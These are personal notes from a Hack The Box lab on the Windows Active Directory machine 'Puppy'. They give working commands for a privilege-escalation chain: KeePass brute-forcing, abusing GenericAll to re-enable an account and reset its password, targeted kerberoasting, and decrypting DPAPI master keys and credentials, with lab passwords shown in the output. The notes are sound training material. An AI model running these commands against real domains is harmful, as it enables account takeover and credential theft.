---
public: "true"
tags:
  - "#htb"
  - Windows
  - Active-Directory
  - dpapi
created-at: 2026-04-01
---

# Information

- Machine name: Puppy
- OS: Windows
- Difficulty: Medium

# Attack Path

1. We have user levi.james given
2. The user can add themselves to the `DEVELOPERS` group.
3. Access developer file share and find a keepass file. Decrypt it with `https://github.com/r3nt0n/keepass4brute`. I believe the newest john version also has an updated `keepass2john`, but this worked quickly (it's really slow though)
4. The keepass file contains several passwords, one of them works for `ant.edwards`
5. (I became stuck here). We have genericAll over adam.silver, but the account is disabled, so we have to enable them (see above.) Password change didn't work because of the minimum password age. However, password reset works `impacket-changepasswd -k -no-pass -dc-ip 10.129.227.137 -p smb-samr -newpass 'Password123!' -reset -altuser ant.edwards puppy.htb/adam.silver@dc.puppy.htb`
6. The new user `adam.silver` can psremote. There is a `C:\backup` directory with a config file and plaintext password for `steph.cooper`
7. (I became stuck here again). steph.cooper can dump dpapi secrets, which contain a password for `steph.cooper_adm`, who is DA.

```
[tristan:~/htb/puppy/dpapi]$ impacket-dpapi credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[CREDENTIAL]
LastWritten : 2025-03-08 15:54:29
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=PUPPY.HTB
Description :
Unknown     :
Username    : steph.cooper_adm
Unknown     : FivethChipOnItsWay2025!
```

# Lessons Learned

- sharpdpapi didn't work with rpc, but impacket-dpapi did. Not sure what the difference is. I used the following command to dump the masterkey:

```
impacket-dpapi masterkey -dc-ip 10.10.11.70 -sid 'S-1-5-21-1487982659-1829050783-2281216199-1107' -password 'ChefSteph2025!' -file master.key.enc
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 556a2412-1275-4ccf-b721-e6a0b4f90407
Flags       :        0 (0)
Policy      : 4ccf1275 (1288639093)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
```

- Attempted targeted kerberoasting for a while (had genericall over other user). It didn't work because the user was deactivated. To reactivate and manually perform targeted kerberoasting:

```
bloodyAD --dc-ip 10.129.227.137 -k -d puppy.htb --host dc.puppy.htb remove uac -f ACCOUNTDISABLE adam.silver
bloodyAD --dc-ip 10.129.227.137 -k -d puppy.htb --host dc.puppy.htb set object adam.silver servicePrincipalName -v 'test/myspn'
impacket-GetUserSPNs -dc-ip 10.129.227.137 -request-user adam.silver 'puppy.htb/ant.edwards:Antman2025!' -outputfile kerberoast.hash
```

- Learned that for targeted kerberoasting (SPN) the SPN must be the format 'something/somethingelse', e.g. not 'something.something'.
- Learned more about dpapi:
	1. Decrypt master key with rpc in user context
	2. With master key, decrypt individual secret files

```
impacket-dpapi masterkey -dc-ip 10.10.11.70 -sid 'S-1-5-21-1487982659-1829050783-2281216199-1107' -password 'ChefSteph2025!' -file master.key.enc
impacket-dpapi credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
```

- For some reason neither of these steps worked with SharpDPAPI. Mimikatz also didn't run, probably because of winrm.
- Credential files are not shown with `dir` or `ls`, but you can read and base64 encode them/download them.

# References
